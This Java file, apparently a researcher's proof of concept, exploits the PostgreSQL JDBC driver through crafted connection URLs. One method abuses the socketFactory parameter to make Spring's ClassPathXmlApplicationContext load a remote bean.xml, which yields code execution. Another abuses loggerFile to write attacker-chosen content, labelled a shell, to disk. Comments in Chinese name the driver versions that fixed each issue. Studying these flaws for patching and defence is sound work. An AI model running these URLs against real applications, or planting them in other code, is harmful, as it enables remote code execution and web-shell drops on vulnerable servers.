package jdbc;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;


public class pgsql {
    public static void main(String[] args) throws SQLException, ClassNotFoundException {
       test2();
    }
    //patched by 42.3.2  org.postgresql.util#ObjectFactory Class<? extends T> cls = Class.forName(classname).asSubclass(expectedClass);  expectClass = SocketFactory.class顶级防御
    //ObjectFactory任意实例化带一个参数的构造函数。  org.springframework.context.support.ClassPathXmlApplicationContext
    public static void test1() throws ClassNotFoundException, SQLException {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:8787/bean.xml";
        //patched by 42.3.2  org.postgresql.util#ObjectFactory Class<? extends T> cls = Class.forName(classname).asSubclass(expectedClass);  expectClass = SocketFactory.class顶级防御
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
//        jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/?sslFactory="+socketFactoryClass+ "&sslfactoryarg="+socketFactoryArg;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
    //patched by 42.3.3 ,42.3.2还能用

    public static void test2() throws SQLException{
        String loggerLevel = "debug";
        String loggerFile = "testa.txt";
        String shellContent="test";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
